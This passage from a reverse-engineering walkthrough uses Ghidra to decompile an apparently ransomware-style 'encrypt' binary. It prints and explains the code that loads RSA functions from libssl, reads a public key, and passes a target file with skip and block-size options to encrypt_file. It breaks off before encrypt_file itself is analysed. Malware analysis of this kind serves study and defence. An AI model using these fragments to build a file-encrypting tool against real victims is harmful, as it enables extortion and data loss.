</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    local_28 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    local_38 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">&lt;</span> param_1) {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>));
</span></span><span style="display:flex;"><span>      local_28 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> param_1) {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>));
</span></span><span style="display:flex;"><span>      local_30 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">5</span> <span style="color:#f92672">&lt;</span> param_1) {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>));
</span></span><span style="display:flex;"><span>      local_38 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_libssl</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_pk_data</span>(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>),<span style="color:#f92672">&amp;</span>local_18);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_rsa_obj</span>(local_18,<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">encrypt_file</span>(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),local_20,local_28,local_30,local_38);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;encrypt_file&#34;</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>            local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;create_rsa_obj&#34;</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>          local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;get_pk_data&#34;</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;init_libssl returned %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)local_c);
</span></span><span style="display:flex;"><span>      local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_4c;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s break down what we&rsquo;re seeing here.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">long</span> param_2)
</span></span></code></pre></div><p>We can see that the <code>main</code> function will take in 2 parameters. In C programs, these 2 parameters will usually be <code>argc</code> and <code>argv</code>. <code>argc</code> is the argument counter and <code>argv</code> is the array that holds all the arguments.</p>
<p>Just to make it easier to analyze this binary, I&rsquo;ll rename the symbols as we analyze them. I&rsquo;ll rename <code>param_1</code> to <code>argc</code> because <code>param_1</code> is definitely the argument counter. And I&rsquo;ll rename <code>param_2</code> to <code>argv</code>.</p>
<p>Since <code>param_2</code>&rsquo;s type is <code>long</code>, I&rsquo;ll change it back to being <code>char**</code> using Ghidra&rsquo;s retype variable feature.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;usage: encrypt &lt;public_key&gt; &lt;file_to_encrypt&gt; [&lt;enc_step&gt;] [&lt;enc_size&gt;] [&lt;file_size&gt;]&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       enc_step   -   number of MB to skip while encryption&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       enc_size   -   number of MB in encryption block&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;       file_size  -   file size in bytes (for sparse files)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see there&rsquo;s a usage text here. So we need 3 arguments for this program or this message will show up. And we can see that this binary needs a public key and a path to the file to be encrypted.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">&lt;</span> argc) {
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">3</span>]);
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> argc) {
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">4</span>]);
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">5</span> <span style="color:#f92672">&lt;</span> argc) {
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(argv[<span style="color:#ae81ff">5</span>]);
</span></span><span style="display:flex;"><span>  local_38 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, we can see that it checks for additional arguments. These addtional arguments are specified in the <em>usage</em> message.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_libssl</span>();
</span></span></code></pre></div><p>Here, the program calls the <code>init_libssl()</code> function, that looks quite interesting so let&rsquo;s break that function down and see what happens there.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>plibssl <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlopen</span>(<span style="color:#e6db74">&#34;libssl.so&#34;</span>,<span style="color:#ae81ff">2</span>);
</span></span></code></pre></div><p>We can see that this function will use <code>dlopen()</code> which uses the linker to open a <code>libssl.so</code> file. A linker is a program that links external object files with the current program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (plibssl <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; (<span style="color:#66d9ef">int</span>)local_3c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span>; local_3c <span style="color:#f92672">=</span> local_3c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sprintf</span>(local_38,<span style="color:#e6db74">&#34;libssl.so.%d&#34;</span>,(ulong)local_3c);
</span></span><span style="display:flex;"><span>    plibssl <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlopen</span>(local_38,<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (plibssl <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (plibssl <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LAB_00400de1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, we can see that if <code>plibssl == 0</code> which means if the previous <code>dlopen()</code> function fails, it will try to find some version of <code>libssl.so</code> via <code>&quot;libssl.so.%d&quot;</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>lBIO_new_mem_buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;BIO_new_mem_buf&#34;</span>);
</span></span></code></pre></div><p>After it finds a <code>libssl.so</code>, it uses <code>dlsym()</code> to dynamically load the <code>BIO_new_mem_buf</code> symbol from the libssl at runtime.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>lERR_error_string <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;ERR_error_string&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (lERR_error_string <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>  local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  lPEM_read_bio_RSA_PUBKEY <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lPEM_read_bio_RSA_PUBKEY <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    lPEM_read_bio_RSAPrivateKey <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;PEM_read_bio_RSAPrivateKey&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lPEM_read_bio_RSAPrivateKey <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      lRAND_pseudo_bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;RAND_pseudo_bytes&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (lRAND_pseudo_bytes <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        lRSA_public_encrypt <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;RSA_public_encrypt&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lRSA_public_encrypt <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          lRSA_private_decrypt <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;RSA_private_decrypt&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (lRSA_private_decrypt <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            lRSA_size <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(plibssl,<span style="color:#e6db74">&#34;RSA_size&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (lRSA_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>              local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>              local_4c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This section is doing pretty much the same thing as before. So it&rsquo;s trying to grab a bunch of different functions to call later on. We derive what this program wants to do from these functions.</p>
<p>It&rsquo;s trying to get <code>PEM_read_bio_RSA_PUBKEY</code> to read an RSA public key, it&rsquo;s trying to get <code>PEM_read_bio_RSAPrivateKey</code> to read an RSA private key, it&rsquo;s trying to get <code>RAND_pseudo_bytes</code> to generate random bytes, which will probably be used for encrypting the files, etc. So we can guess that this is loading a bunch of different <strong>RSA</strong> functions to use for encrypting.</p>
<p>So that&rsquo;s the <code>init_libssl()</code> function, it&rsquo;s loading in some functions from <code>libssl</code> for the program. Let&rsquo;s go back to the <code>main</code> function and continue analyzing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_pk_data</span>(argv[<span style="color:#ae81ff">1</span>],<span style="color:#f92672">&amp;</span>local_18);
</span></span></code></pre></div><p>We can see that it&rsquo;s calling another function called <code>get_pk_data()</code>. I&rsquo;m assuming <code>pk</code> means public key because we are trying to encrypt the files and we use public key to encrypt files in asymmetric encryption as I&rsquo;ve mentioned earlier.</p>
<p>Still, let&rsquo;s jump into the function and see what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_read</span>(param_1);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (__fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;open_pk_file&#34;</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is reading from a file. I&rsquo;m assuming it&rsquo;s the public key file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__nbytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">lseek</span>(__fd,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (__nbytes <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;lseek [end]&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (__nbytes <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;get_pk_data: key file is empty!&#34;</span>);
</span></span><span style="display:flex;"><span>  local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is using <code>lseek()</code> to seek to the end of the file and make sure that the file is not empty.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pvVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(__nbytes <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>param_2 <span style="color:#f92672">=</span> pvVar1;
</span></span><span style="display:flex;"><span>_Var2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">lseek</span>(__fd,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_Var2 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;lseek [start]&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>  sVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(__fd,<span style="color:#f92672">*</span>param_2,__nbytes);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (sVar3 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_error</span>(<span style="color:#f92672">&amp;</span>DAT_0040841e,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(__fd);
</span></span><span style="display:flex;"><span>    local_3c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, the program is basically allocating a buffer of size <code>__nbytes + 1</code> and read from the file it just opened into that buffer, the buffer gets assigned to <code>param_2</code>, it closes the file and then after this section, it just returns.</p>
<p>So in the <code>get_pk_data()</code> function, it&rsquo;s essentially just reading the public key into the second parameter. So in the main function, I&rsquo;ll rename this parameter (now <code>local_18</code>) into <code>public_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_rsa_obj</span>(public_key_buffer,<span style="color:#f92672">&amp;</span>local_20);
</span></span></code></pre></div><p>Back in the <code>main</code> function, next up is this <code>create_rsa_obj</code> line. So this function is probably taking in the <code>public_key_buffer</code> that <code>get_pk_data()</code> just created, generate an RSA object and probably assign that object to <code>local_20</code>.</p>
<p>To make sure my assumptions are correct, let&rsquo;s jump into that function and see.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">create_rsa_obj</span>(undefined8 param_1,undefined8 <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_2c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lBIO_new_mem_buf)(param_1,<span style="color:#ae81ff">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_error_ex</span>(<span style="color:#e6db74">&#34;BIO_new_mem_buf&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    local_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    lVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lPEM_read_bio_RSA_PUBKEY)(lVar1,param_2,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">print_error_ex</span>(<span style="color:#e6db74">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      local_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      local_2c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_2c;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is pretty short and easy to understand so I&rsquo;ll go over it quickly. So we can see that it is calling a <em>Basic I/O memory buffer</em> function, it reads from that buffer, it creates an RSA public key object from the <code>public_key_buffer</code> and it assigns the object to <code>param_2</code>, which in our case is <code>local_20</code>. So let&rsquo;s rename <code>local_20</code> into <code>rsa_key_object</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">encrypt_file</span>(argv[<span style="color:#ae81ff">2</span>],rsa_key_object,local_28,local_30,local_38);
</span></span></code></pre></div><p>Next up in the <code>main</code> function is a very interesting function. This is where the encrypting happens. We can already see that it&rsquo;s taking in <code>argv[2]</code> which is the path to a file and the <code>rsa_key_object</code>. Let&rsquo;s jump right into this function and see how it works.</p>
